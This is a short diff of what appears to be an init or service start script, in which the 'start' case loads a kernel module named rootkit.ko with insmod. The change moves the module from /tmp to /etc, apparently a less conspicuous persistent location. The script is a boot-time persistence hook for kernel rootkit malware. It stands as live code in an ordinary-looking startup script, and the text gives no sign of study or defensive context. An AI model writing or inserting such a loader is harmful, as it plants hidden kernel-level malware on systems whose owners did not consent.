@@ -2,7 +2,7 @@
 
 case $1 in
     start)
-        /sbin/insmod /tmp/rootkit.ko
+        /sbin/insmod /etc/rootkit.ko
     ;;
 esac
 exit 0
